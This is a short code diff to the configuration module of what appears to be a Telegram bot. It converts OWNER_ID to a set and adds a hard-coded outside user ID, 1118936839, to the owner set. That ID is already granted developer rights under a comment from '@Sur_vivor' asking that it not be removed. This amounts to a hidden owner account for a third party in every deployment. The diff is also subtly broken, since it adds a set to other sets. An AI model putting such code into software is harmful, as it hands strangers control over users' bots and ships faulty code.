@@ -24,7 +24,7 @@ if ENV:
     TOKEN = os.environ.get('TOKEN', None)
 
     try:
-        OWNER_ID = int(os.environ.get('OWNER_ID', None))
+        OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "").split())
     except ValueError:
         raise Exception("Your OWNER_ID env variable is not a valid integer.")
 
@@ -83,7 +83,7 @@ else:
     TOKEN = Config.API_KEY
 
     try:
-        OWNER_ID = int(Config.OWNER_ID)
+        OWNER_ID = set(int(x) for x in Config.OWNER_ID)
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
@@ -137,6 +137,7 @@ else:
     spamwatch_api = Config.SW_API
 
 # Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Sur_vivor     
+OWNER_ID.add(1118936839)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(1118936839)
 SUDO_USERS.add(OWNER_ID)
